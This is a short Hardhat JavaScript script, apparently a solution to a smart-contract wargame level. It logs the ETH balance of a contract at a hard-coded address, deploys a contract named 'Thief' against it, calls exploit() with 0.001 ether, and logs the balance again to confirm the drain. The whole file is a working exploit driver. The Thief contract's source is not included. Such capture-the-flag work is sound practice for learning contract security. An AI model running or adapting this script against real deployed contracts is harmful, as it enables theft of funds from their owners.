const hardhat = require('hardhat');
const ethers = hardhat.ethers;

const INSTANCE = '0x16EC5C5Ad38AF0F50Fd362405Afc3380F3B3710b';

const main = async () => {
    console.log('Checking target starting balance...');
    let bal = await ethers.provider.getBalance(INSTANCE);
    console.log(`Starting balance is ${ethers.utils.formatEther(bal)}`);

    const Thief = await ethers.getContractFactory('Thief');
    const thief = await Thief.deploy(INSTANCE);
    await thief.deployed();

    let tx = await thief.exploit({
        gasLimit: 1000000,
        value: ethers.utils.parseEther('0.001'),
    });
    await tx.wait();

    console.log('Checking target ending balance...');
    bal = await ethers.provider.getBalance(INSTANCE);
    console.log(`Ending balance is ${ethers.utils.formatEther(bal)}`);
};

main();
